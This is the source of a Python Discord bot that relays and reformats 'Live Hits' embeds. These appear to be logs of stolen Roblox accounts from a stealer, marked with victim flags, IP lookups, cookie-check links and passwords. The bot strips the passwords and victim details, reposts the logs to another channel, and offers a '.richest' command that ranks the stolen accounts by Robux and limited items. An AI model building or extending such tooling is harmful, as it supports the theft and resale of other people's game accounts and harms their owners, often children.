import discord
import re
import os
import asyncio
from keep_alive import keep_alive

# Start the keep-alive server
keep_alive()

# Get bot token from environment variable
TOKEN = os.getenv("DISCORD_TOKEN")

SOURCE_CHANNEL_ID = 1414236802876968985  # Source channel
TARGET_CHANNEL_ID = 1414237079013163091  # Target channel
PREFIX = "."  # command prefix

intents = discord.Intents.default()
intents.message_content = True

bot = discord.Client(intents=intents)

def clean_embed(embed: discord.Embed) -> discord.Embed:
    original_title = embed.title or "Live Hits"
    new_embed = discord.Embed(
        title=original_title,
        color=embed.color or discord.Color.blue()
    )

    if embed.thumbnail:
        new_embed.set_thumbnail(url=embed.thumbnail.url)
    if embed.image:
        new_embed.set_image(url=embed.image.url)

    emoji_pattern = re.compile(r":[^:]+:|<a?:\w+:\d+>")
    description = embed.description or ""
    
    robux_emoji = "<:robux:1405452141535170622>"
    description = description.replace("Robux", f"Robux {robux_emoji}")
    description = description.replace("robux", f"robux {robux_emoji}")

    description_lines = description.split("\n")
    cleaned_lines = []
    skip_next = False
    for line in description_lines:
        stripped = line.strip()

        if skip_next:  # Skip password line
            skip_next = False
            continue

        if stripped.lower().startswith("password"):
            skip_next = True
            continue
        if "account age" in stripped.lower():
            continue
        if "victimflag" in stripped.lower() or "ipinfo.io" in stripped.lower():
            continue
        if "collectiblesfalse" in stripped.lower():
            continue
        if "+1 HIT • You've Earned 1 Splunk X XP" in stripped:
            continue
        if stripped.startswith("## [**__Check Cookie__**]") or stripped.startswith("[**__Discord Server__**]"):
            continue

        cleaned_lines.append(line)

    description = "\n".join(cleaned_lines)
    description = emoji_pattern.sub("", description).strip()
    new_embed.description = description

    for field in embed.fields:
        name_clean = emoji_pattern.sub("", field.name)
        value_clean = emoji_pattern.sub("", field.value)

        if "password" in name_clean.lower():
            continue
        if "account age" in name_clean.lower():
            continue
        if "victimflag" in name_clean.lower():
            continue

        if "collectibles" in name_clean.lower():
            values = [v.strip() for v in value_clean.split("\n") if v.strip()]
            new_values = []
            emojis = [
                "<:HeadlessHorseman:1414237486179418163>",
                "<:korblox:1414237555880104066>",
                "<:verifiedhat:1414237442147352738>"
            ]
            for i, val in enumerate(values[:3]):  # Only process first 3 lines
                new_values.append(f"{emojis[i]} {val}")
            if len(values) > 3:  # Keep any additional lines
                new_values.extend(values[3:])
            value_clean = "\n".join(new_values)

        new_embed.add_field(name=name_clean, value=value_clean, inline=field.inline)

    if embed.footer and embed.footer.text:
        new_embed.set_footer(text=emoji_pattern.sub("", embed.footer.text))
    if embed.author and embed.author.name:
        new_embed.set_author(name=emoji_pattern.sub("", embed.author.name))

    return new_embed
    
@bot.event
async def on_message(message):
    if message.channel.id == SOURCE_CHANNEL_ID and message.embeds:
        embed = message.embeds[0]
        cleaned = clean_embed(embed)
        target_channel = bot.get_channel(TARGET_CHANNEL_ID)
        if target_channel:
            await target_channel.send(embed=cleaned)

    if message.content.strip().lower() == f"{PREFIX}test":
        source_channel = bot.get_channel(SOURCE_CHANNEL_ID)
        if not source_channel:
            await message.channel.send("Source channel not found.")
            return
          
       # .richest command
    if message.content.strip().lower() == f"{PREFIX}richest":
        source_channel = bot.get_channel(SOURCE_CHANNEL_ID)
        if not source_channel:
            await message.channel.send("Source channel not found.")
            return

        most_expensive = None
        highest_value = 0

        async for msg in source_channel.history(limit=50):  # Check last 50 messages
            if msg.embeds:
                embed = msg.embeds[0]

                # Look for Robux mentions in description
                description = embed.description or ""
                robux_value = 0
                for word in description.split():
                    if word.replace(",", "").isdigit():
                        robux_value = max(robux_value, int(word.replace(",", "")))

                # Look for collectible items in fields
                collectibles_value = 0
                for field in embed.fields:
                    if "collectibles" in field.name.lower():
                        # Example: "Headless Horseman" → give it a high value
                        if "headless" in field.value.lower():
                            collectibles_value += 31000
                        if "korblox" in field.value.lower():
                            collectibles_value += 17000
                        if "verified hat" in field.value.lower():
                            collectibles_value += 10000

                total_value = robux_value + collectibles_value

                if total_value > highest_value:
                    highest_value = total_value
                    most_expensive = embed

        if most_expensive:
            cleaned = clean_embed(most_expensive)
            await message.channel.send(f"💎 The richest account found is worth **{highest_value} Robux+items**")
            await message.channel.send(embed=cleaned)
        else:
            await message.channel.send("No expensive accounts found in recent messages.")




bot.run(TOKEN)

